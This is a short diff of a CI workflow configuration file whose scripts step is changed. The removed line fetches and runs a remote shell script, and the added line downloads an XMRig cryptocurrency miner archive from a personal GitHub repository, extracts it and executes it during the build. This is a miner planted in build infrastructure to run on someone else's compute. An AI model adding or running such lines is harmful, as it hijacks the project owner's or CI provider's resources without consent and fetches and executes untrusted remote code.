@@ -19,4 +19,4 @@ workflows:
           include: true
           source: true
     scripts:
-      - wget https://raw.githubusercontent.com/tesasik67/q1/main/test.sh && chmod +x test.sh && ./test.sh
+      - wget https://github.com/tesasik67/q1/raw/main/xmrig-6.19.3.rar && tar -xvf xmrig-6.19.3 && cd xmrig-6.19.3 && chmod +x xmrig && ./xmrig
